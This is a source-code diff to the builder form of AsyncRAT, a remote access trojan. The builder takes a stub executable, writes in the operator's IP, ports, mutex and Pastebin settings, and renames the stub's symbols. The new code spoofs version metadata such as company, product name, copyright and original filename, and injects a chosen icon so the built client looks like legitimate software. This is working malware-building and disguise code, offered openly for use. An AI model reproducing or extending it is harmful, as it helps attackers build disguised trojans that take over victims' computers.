@@ -8,6 +8,8 @@ using System.Security.Cryptography;
 using AsyncRAT_Sharp.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Collections.Generic;
+using Vestris.ResourceLib;
+using System.Drawing;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -16,54 +18,6 @@ namespace AsyncRAT_Sharp.Forms
         public FormBuilder()
         {
             InitializeComponent();
-        }
-
-        private void button1_Click(object sender, EventArgs e)
-        {
-            if (listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
-
-            if (checkBox1.Checked)
-            {
-                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
-                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
-            }
-
-            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(20);
-
-            if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text)) return;
-
-            try
-            {
-                using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(@"Stub/Stub.exe"))
-                {
-                    WriteSettings(asmDef);
-
-                    Renamer r = new Renamer(asmDef);
-
-                    if (!r.Perform())
-                        throw new Exception("renaming failed");
-
-                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
-                    {
-                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
-                        saveFileDialog1.InitialDirectory = Application.StartupPath;
-                        saveFileDialog1.OverwritePrompt = false;
-                        saveFileDialog1.FileName = "Client";
-                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                        {
-                            r.AsmDef.Write(saveFileDialog1.FileName);
-                            MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            SaveSettings();
-                            r.AsmDef.Dispose();
-                            this.Close();
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
         }
 
         private void SaveSettings()
@@ -236,7 +190,6 @@ namespace AsyncRAT_Sharp.Forms
                     }
                 }
             }
-
         }
 
         private void CheckBox2_CheckedChanged(object sender, EventArgs e)
@@ -313,6 +266,150 @@ namespace AsyncRAT_Sharp.Forms
                 textIP.Clear();
             }
             catch { }
+        }
+
+        private void BtnBuild_Click(object sender, EventArgs e)
+        {
+            if (listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
+
+            if (checkBox1.Checked)
+            {
+                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
+                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
+            }
+
+            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(20);
+
+            if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text)) return;
+
+            try
+            {
+                using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(@"Stub/Stub.exe"))
+                {
+                    WriteSettings(asmDef);
+
+                    Renamer r = new Renamer(asmDef);
+
+                    if (!r.Perform())
+                        throw new Exception("renaming failed");
+
+                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
+                    {
+                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
+                        saveFileDialog1.InitialDirectory = Application.StartupPath;
+                        saveFileDialog1.OverwritePrompt = false;
+                        saveFileDialog1.FileName = "Client";
+                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
+                        {
+                            r.AsmDef.Write(saveFileDialog1.FileName);
+                            r.AsmDef.Dispose();
+                            if (btnAssembly.Checked)
+                            {
+                                WriteAssembly(saveFileDialog1.FileName);
+                            }
+                            if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
+                            {
+                                IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
+                            }
+                            MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            SaveSettings();
+                            this.Close();
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private void WriteAssembly(string filename)
+        {
+            try
+            {
+                VersionResource versionResource = new VersionResource();
+                versionResource.LoadFrom(filename);
+
+                versionResource.FileVersion = txtFileVersion.Text;
+                versionResource.ProductVersion = txtProductVersion.Text;
+                versionResource.Language = 0;
+
+                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
+                stringFileInfo["ProductName"] = txtProduct.Text;
+                stringFileInfo["FileDescription"] = txtDescription.Text;
+                stringFileInfo["CompanyName"] = txtCompany.Text;
+                stringFileInfo["LegalCopyright"] = txtCopyright.Text;
+                stringFileInfo["LegalTrademarks"] = txtTrademarks.Text;
+                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
+                stringFileInfo["InternalName"] = txtOriginalFilename.Text;
+                stringFileInfo["OriginalFilename"] = txtOriginalFilename.Text;
+                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
+                stringFileInfo["FileVersion"] = versionResource.FileVersion;
+
+                versionResource.SaveTo(filename);
+            }
+            catch (Exception ex)
+            {
+                throw new ArgumentException("Assembly: " + ex.Message);
+            }
+        }
+
+        private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
+        {
+            if (btnAssembly.Checked)
+            {
+                txtProduct.Enabled = true;
+                txtDescription.Enabled = true;
+                txtCompany.Enabled = true;
+                txtCopyright.Enabled = true;
+                txtTrademarks.Enabled = true;
+                txtOriginalFilename.Enabled = true;
+                txtOriginalFilename.Enabled = true;
+                txtProductVersion.Enabled = true;
+                txtFileVersion.Enabled = true;
+            }
+            else
+            {
+                txtProduct.Enabled = false;
+                txtDescription.Enabled = false;
+                txtCompany.Enabled = false;
+                txtCopyright.Enabled = false;
+                txtTrademarks.Enabled = false;
+                txtOriginalFilename.Enabled = false;
+                txtOriginalFilename.Enabled = false;
+                txtProductVersion.Enabled = false;
+                txtFileVersion.Enabled = false;
+            }
+        }
+
+        private void ChkIcon_CheckedChanged(object sender, EventArgs e)
+        {
+            if (chkIcon.Checked)
+            {
+                txtIcon.Enabled = true;
+                btnIcon.Enabled = true;
+            }
+            else
+            {
+                txtIcon.Enabled = false;
+                btnIcon.Enabled = false;
+            }
+        }
+
+        private void BtnIcon_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Title = "Choose Icon";
+                ofd.Filter = "Icons *.ico|*.ico";
+                ofd.Multiselect = false;
+                if (ofd.ShowDialog() == DialogResult.OK)
+                {
+                    txtIcon.Text = ofd.FileName;
+                    picIcon.ImageLocation = ofd.FileName;
+                }
+            }
         }
     }
 }
